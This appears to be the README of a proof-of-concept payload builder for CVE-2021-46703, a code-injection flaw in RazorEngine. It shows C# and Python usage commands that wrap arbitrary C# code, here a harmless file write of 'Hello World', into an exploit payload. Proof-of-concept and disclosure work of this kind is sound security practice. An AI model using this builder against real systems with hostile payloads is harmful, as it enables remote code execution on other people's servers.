# CVE-2021-46703
Simple payload builder based on POC in: https://github.com/Antaris/RazorEngine/issues/585

## Usage

### C#
```bash
dotnet build --configuration Release
.\bin\Release\net4.8\Poc.exe "System.IO.File.WriteAllText(\"rce.txt\", \"Hello World\");"
```
### Python
```bash
./poc.py "System.IO.File.WriteAllText(\"rce.txt\", \"Hello World\");"
```

## Acknowledgements
- https://www.yielddd.com/about-us/discovery-of-a-critical-open-source-vulnerability-cve-2021-46703
